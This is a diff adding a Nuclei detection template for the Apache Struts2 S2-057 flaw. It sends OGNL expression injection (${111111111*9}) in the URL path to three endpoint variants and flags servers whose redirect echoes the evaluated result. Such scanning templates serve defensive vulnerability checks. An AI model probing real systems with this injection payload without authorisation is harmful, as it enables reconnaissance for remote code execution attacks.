@@ -1,0 +1,32 @@
+id: s2-057-redirect-official
+
+info:
+  name: Apache Struts2 S2-057 - Official Target Aligned
+  author: seal
+  severity: critical
+  description: Ensures the S2-057 showcase endpoint is hit precisely alongside dynamic routing.
+  tags: safe-poc, struts2, cve, cve2018, s2-057, exploit
+
+http:
+  - raw:
+      # 物理逻辑：如果 ETL 传入的 URL 是 http://ip:8080/struts2-showcase
+      # Nuclei 解析的 {{Path}} 会是 /struts2-showcase
+      # 拼接后严格等于 -> GET /struts2-showcase/%24%7B111111111*9%7D/actionChain1.action
+      - "GET {{Path}}/%24%7B111111111*9%7D/actionChain1.action HTTP/1.1\r\nHost: {{Hostname}}\r\nConnection: close\r\nAccept-Encoding: gzip\r\n\r\n"
+
+      - "GET {{replace_regex(Path, '[^/]+$', '')}}%24%7B111111111*9%7D/{{replace_regex(Path, '^.*/', '')}} HTTP/1.1\r\nHost: {{Hostname}}\r\nConnection: close\r\nAccept-Encoding: gzip\r\n\r\n"
+
+      - "GET /struts2-showcase/%24%7B111111111*9%7D/actionChain1.action HTTP/1.1\r\nHost: {{Hostname}}\r\nConnection: close\r\nAccept-Encoding: gzip\r\n\r\n"
+
+    unsafe: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?i)Location:.*999999999'
+          
+      - type: status
+        status:
+          - 302
